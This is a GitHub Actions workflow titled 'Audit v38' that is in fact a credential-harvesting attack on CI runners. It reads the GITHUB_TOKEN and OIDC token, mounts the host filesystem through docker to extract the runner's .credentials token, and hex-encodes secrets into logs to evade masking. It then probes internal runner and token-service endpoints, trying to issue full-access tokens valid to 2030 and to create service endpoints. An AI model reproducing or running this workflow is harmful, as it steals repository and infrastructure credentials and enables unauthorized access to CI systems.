name: Audit v38
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v38:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest (fixed timeline extraction)
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V38 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            # Fix: try multiple timeline patterns
            TL=$(grep -oP '"timelineId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            [ -z "$TL" ] && TL=$(grep -oP 'timelineId[= :]+\K[0-9a-f-]+' "$WLOG" | head -1)
            [ -z "$TL" ] && TL=$(grep -oP '"timeline"\s*:\s*\{[^}]*"id"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB TL=$TL"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt; echo "$TL" > /tmp/tl.txt

            # Dump ALL GUIDs from worker log for timeline discovery
            echo "--- All unique GUIDs in worker log ---"
            grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' "$WLOG" | sort -u | head -20
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: Runner service — FULL 12 resource areas
      # v37: IDTOK got 12 areas on runner (truncated output)
      # Need full listing with ALL locationUrls
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Runner full areas
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RUNNER FULL AREAS ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          RUNNER="https://runner.actions.githubusercontent.com/$SECRET"

          # A: Full resource areas with IDTOK
          echo "--- A: Runner areas (IDTOK) ---"
          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" "$RUNNER/_apis/resourceareas")
          echo "count=$(echo "$R" | jq '.count // empty' 2>/dev/null)"
          echo "$R" | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
          echo ""

          # B: Runner parent areas
          echo "--- B: Runner parent areas ---"
          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" \
            "https://runner.actions.githubusercontent.com/$SECRET/../_apis/resourceareas")
          echo "count=$(echo "$R" | jq '.count // empty' 2>/dev/null)"
          echo "$R" | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
          echo ""

          # C: Hit each runner endpoint systematically
          echo "--- C: Runner endpoints ---"
          for EP in \
            "/_apis/v1/runners" \
            "/_apis/v1/runner/me" \
            "/_apis/v1/runner/groups" \
            "/_apis/v1/message" \
            "/_apis/v1/session" \
            "/_apis/v1/jobs" \
            "/_apis/v1/tenants" \
            "/_apis/runners" \
            "/_apis/runners/me" \
            "/_apis/message" \
            "/_apis/session" \
            "/_apis/jobs" \
            "/_apis/tenants" \
            "/_apis/actions/v1/runners" \
            "/_apis/actions/runners" \
            "/_apis/actions/runner-registration" \
            "/_apis/actions/runner/me" \
            "/_apis/distributedtask/pools" \
            "/_apis/distributedtask/pools/1" \
            "/_apis/distributedtask/pools/1/agents" \
            "/_apis/distributedtask/agents" \
            "/_apis/distributedtask/pools/1/sessions" \
            "/_apis/distributedtask/pools/1/messages"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "$RUNNER$EP")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: vstoken TokenIssue + TokenAuth with IDTOK
      # v37: IDTOK auths on vstoken (connData=200, 7 areas)
      # Now hit the actual token services
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - vstoken token services
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== VSTOKEN TOKEN SERVICES ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
          PLAN=$(cat /tmp/plan.txt)

          for TOK_NAME in IDTOK RT CTOK; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
            echo "=== TOKEN: $TOK_NAME ==="

            # A: TokenIssue
            echo "--- A: TokenIssue ---"
            for EP in \
              "/_apis/TokenIssue" \
              "/_apis/TokenIssue/issue" \
              "/_apis/TokenIssue/tokens" \
              "/_apis/Token/Issue" \
              "/_apis/token/issue" \
              "/_apis/tokens" \
              "/_apis/tokens/issue"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$VSBASE$EP")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "A $EP = $CODE | $(echo "$BODY" | head -c 200)"
            done

            # B: TokenIssue POST (try to issue a token)
            echo "--- B: TokenIssue POST ---"
            for EP in \
              "/_apis/TokenIssue" \
              "/_apis/TokenIssue/issue" \
              "/_apis/tokens" \
              "/_apis/token"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "$VSBASE$EP" \
                -d "{\"scope\":\"vso.full_access\",\"displayName\":\"v38-token\",\"validTo\":\"2030-01-01T00:00:00Z\"}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
            done

            # C: TokenAuth
            echo "--- C: TokenAuth ---"
            for EP in \
              "/_apis/TokenAuth" \
              "/_apis/TokenAuth/validate" \
              "/_apis/TokenAuth/verify" \
              "/_apis/Token/Auth" \
              "/_apis/token/auth"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$VSBASE$EP")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
            done

            # D: tokenoauth2 (separate from oauth2!)
            echo "--- D: tokenoauth2 ---"
            for EP in \
              "/_apis/tokenoauth2" \
              "/_apis/tokenoauth2/token" \
              "/_apis/tokenoauth2/authorize"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$VSBASE$EP")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "D $EP = $CODE | $(echo "$BODY" | head -c 200)"
            done
            echo ""
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: IDTOK writes with proper API versions
      # v37: 404 on writes — might need api-version param
      # Also: try timeline operations with discovered GUIDs
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - IDTOK writes versioned
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== IDTOK WRITES VERSIONED ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          BASE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          RUNID="${{ github.run_id }}"

          # A: Try with API versions
          echo "--- A: Versioned writes ---"
          for VER in "6.0-preview.1" "7.0-preview.1" "7.1-preview.1" "5.2-preview.1" "2.0"; do
            # Variable group
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              "$BASE/_apis/distributedtask/variablegroups?api-version=$VER" \
              -d '{"name":"v38","type":"Vsts","variables":{"key":{"value":"v38"}}}')
            CODE=$(echo "$R" | tail -1)
            [ "$CODE" != "HTTP_404" ] && \
              echo "A vargroup v=$VER = $CODE | $(echo "$R" | sed '$d' | head -c 150)"

            # Service endpoint
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              "$BASE/_apis/serviceendpoint/endpoints?api-version=$VER" \
              -d '{"name":"v38","type":"generic","url":"https://v38.test"}')
            CODE=$(echo "$R" | tail -1)
            [ "$CODE" != "HTTP_404" ] && \
              echo "A endpoint v=$VER = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
          done
          echo ""

          # B: Timeline operations using plan+job as timeline
          echo "--- B: Timeline via plan ---"
          # Try using planId as timeline, or jobId, or both
          for TL_CAND in "$PLAN" "$JOB" "${PLAN}"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              "$BASE/_apis/distributedtask/plans/$PLAN/timelines/$TL_CAND/records")
            CODE=$(echo "$R" | tail -1)
            echo "B timeline=$TL_CAND = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          done

          # C: List all timelines for the plan
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: Bearer $IDTOK" \
            "$BASE/_apis/distributedtask/plans/$PLAN/timelines?api-version=6.0-preview.1")
          CODE=$(echo "$R" | tail -1)
          echo "C list timelines = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # With RT too
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: Bearer $RT" \
            "$BASE/_apis/distributedtask/plans/$PLAN/timelines?api-version=6.0-preview.1")
          CODE=$(echo "$R" | tail -1)
          echo "C RT timelines = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # D: Plan logs
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: Bearer $IDTOK" \
            "$BASE/_apis/distributedtask/plans/$PLAN/logs?api-version=6.0-preview.1")
          CODE=$(echo "$R" | tail -1)
          echo "D logs = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: Bearer $RT" \
            "$BASE/_apis/distributedtask/plans/$PLAN/logs?api-version=6.0-preview.1")
          CODE=$(echo "$R" | tail -1)
          echo "D RT logs = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V38 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V38 COMPLETE ==="
